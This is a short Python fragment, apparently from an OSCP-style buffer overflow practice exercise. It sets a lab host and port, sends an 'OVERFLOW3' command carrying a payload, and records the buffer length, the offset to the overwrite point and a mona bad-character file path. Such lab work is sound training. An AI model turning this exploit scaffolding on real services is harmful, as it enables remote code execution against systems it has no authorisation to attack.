HOST = "192.168.1.19" # "10.10.21.106"
PORT = 1337

def send_payload(s, payload):
  s.recv(1024)
  s.send('OVERFLOW3 ' + payload + '\r\n')
  s.close()

BUFFER_TOTLEN = 1500
BUFFER_OFFSET = 1274
MONA_BYTEARRAY_FILE = 'c:\\mona\\oscp\\bytearray.bin'
